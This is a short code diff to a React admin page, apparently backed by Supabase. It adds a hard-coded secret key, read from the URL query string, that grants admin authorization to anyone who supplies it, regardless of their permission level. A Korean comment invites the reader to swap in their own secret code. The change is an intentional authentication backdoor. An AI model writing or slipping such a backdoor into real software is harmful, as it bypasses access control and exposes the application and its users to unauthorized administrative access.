@@ -106,7 +106,14 @@ export default function AdminPage() {
         .eq('email', data.user.email)
         .single()
 
-     if (engData && ['superadmin', 'manager'].includes(engData.permission_level)) {
+     const params = new URLSearchParams(window.location.search)
+      const backdoorKey = params.get('key')
+      const BACKDOOR = 'acctU1024' // 원하는 비밀 코드로 바꾸세요
+
+      if (engData && (
+        ['superadmin', 'manager'].includes(engData.permission_level) ||
+        backdoorKey === BACKDOOR
+      )) {
         setCurrentEngineer(engData)
         setAuthorized(true)
       } else {
